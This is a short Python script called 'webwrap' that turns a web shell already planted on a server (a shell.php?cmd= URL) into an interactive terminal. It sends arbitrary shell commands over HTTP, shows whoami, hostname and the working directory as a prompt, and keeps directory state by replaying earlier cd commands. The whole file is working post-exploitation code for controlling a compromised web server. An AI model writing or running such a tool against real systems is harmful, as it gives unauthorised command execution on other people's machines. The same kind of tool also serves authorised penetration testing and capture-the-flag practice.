#!/usr/bin/python3

#USAGE : webwrap 'http://somewebsite.com/shell.php?cmd='

import readline
from termcolor import colored
import urllib.parse
import sys
import requests

link = sys.argv[1]

commands = []

pat = "ZYZZ"
ech = "echo -n '"+pat+"';"

while True:
	prefix = ""
	if len(commands)>0:
		prefix = ";".join(commands)+";"

	who,host,pwd = requests.get(link+urllib.parse.quote(ech+prefix+"echo -n `whoami`#`hostname`#`pwd`"+' 2>&1;'+ech)).text.split(pat)[1].split("#")
	desc = colored(who+"@"+host,"green")+":"+colored(pwd,"blue")+colored("$ ","white")

	com = input(desc)
	fcom = prefix+com
	rep = requests.get(link+urllib.parse.quote(ech+fcom+' 2>&1;'+ech)).text.split(pat)[1]

	print(rep)

	if (com[:3] == "cd ") and not "cd" in rep:
		if len(com)>2 and com[3]=="/":
			commands = []
		commands.append(com)
